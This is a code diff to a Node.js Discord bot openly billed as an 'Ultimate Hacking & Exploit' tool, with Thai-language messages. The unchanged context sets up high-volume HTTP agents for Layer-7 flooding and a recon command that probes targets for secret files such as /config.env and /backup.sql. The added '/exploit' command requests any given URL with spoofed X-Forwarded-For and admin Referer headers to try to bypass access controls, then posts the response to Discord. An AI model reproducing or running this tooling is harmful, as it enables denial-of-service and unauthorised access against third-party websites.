@@ -1,6 +1,6 @@
 /**
  * ============================================================================
- * JEFF FUJI - ULTIMATE HACKING & RECON DISCORD BOT v3
+ * JEFF FUJI - ULTIMATE HACKING & EXPLOIT DISCORD BOT v4
  * Developed under JARVIS x ARI Protocol
  * ============================================================================
  */
@@ -24,7 +24,6 @@ const client = new Client({
 let isAttacking = false;
 let attackTimers = [];
 
-// Agents สำหรับยิง L7
 const httpAgent = new http.Agent({ keepAlive: true, maxSockets: 10000, maxFreeSockets: 5000 });
 const httpsAgent = new https.Agent({ keepAlive: true, maxSockets: 10000, maxFreeSockets: 5000, rejectUnauthorized: false });
 
@@ -57,6 +56,13 @@ client.once('ready', async () => {
             .addStringOption(option => 
                 option.setName('url')
                     .setDescription('URL เป้าหมาย (เช่น https://example.com)')
+                    .setRequired(true)),
+        new SlashCommandBuilder()
+            .setName('exploit')
+            .setDescription('เจาะลึกทดสอบบายพาสและดึงข้อมูลจากเป้าหมาย')
+            .addStringOption(option => 
+                option.setName('url')
+                    .setDescription('URL เป้าหมายที่มีช่องโหว่')
                     .setRequired(true)),
         new SlashCommandBuilder()
             .setName('stop')
@@ -171,7 +177,6 @@ client.on('interactionCreate', async interaction => {
         const targetUrl = interaction.options.getString('url');
         await interaction.reply(`🔍 กำลังทำ Recon สแกนหาไฟล์ลับและช่องโหว่ของ **${targetUrl}** รอแป๊บไอ้สัส...`);
 
-        // รายการ path ยอดฮิตที่แอดมินชอบซ่อนไว้
         const paths = ['/admin', '/login.php', '/config.env', '/backup.sql', '/phpmyadmin', '/robots.txt', '/wp-login.php', '/server-status'];
         let foundResults = [];
 
@@ -214,6 +219,47 @@ client.on('interactionCreate', async interaction => {
 
         } catch (err) {
             await interaction.followUp(`❌ URL ไม่ถูกต้อง: ${err.message}`);
+        }
+
+    } else if (commandName === 'exploit') {
+        const exploitUrl = interaction.options.getString('url');
+        await interaction.reply(`⚡ กำลังทำ Exploit เจาะลึกและทดสอบดาวน์โหลดข้อมูลจาก **${exploitUrl}**...`);
+
+        try {
+            const parsedUrl = new URL(exploitUrl);
+            const reqLib = parsedUrl.protocol === 'https:' ? https : http;
+
+            const req = reqLib.get(exploitUrl, {
+                headers: {
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Admin-Bypass-Client/1.0',
+                    'X-Forwarded-For': '127.0.0.1',
+                    'Referer': `${parsedUrl.protocol}//${parsedUrl.host}/admin`
+                }
+            }, (res) => {
+                let data = '';
+                res.on('data', (chunk) => { data += chunk; });
+                res.on('end', async () => {
+                    const embed = new EmbedBuilder()
+                        .setTitle('💥 Exploit Result & Payload Response')
+                        .setColor(res.statusCode === 200 ? 0x22c55e : 0xf59e0b)
+                        .addFields(
+                            { name: 'Target URL', value: exploitUrl },
+                            { name: 'HTTP Status', value: `${res.statusCode} ${res.statusMessage}` },
+                            { name: 'Response Preview', value: data.length > 0 ? `\`\`\`html\n${data.slice(0, 500)}...\n\`\`\`` : '*(No Content / Empty Response)*' }
+                        )
+                        .setTimestamp();
+
+                    await interaction.followUp({ embeds: [embed] });
+                });
+            });
+
+            req.on('error', async (err) => {
+                await interaction.followUp(`❌ Exploit ล้มเหลว: ${err.message}`);
+            });
+            req.end();
+
+        } catch (err) {
+            await interaction.followUp(`❌ URL ผิดรูปแบบ: ${err.message}`);
         }
 
     } else if (commandName === 'stop') {
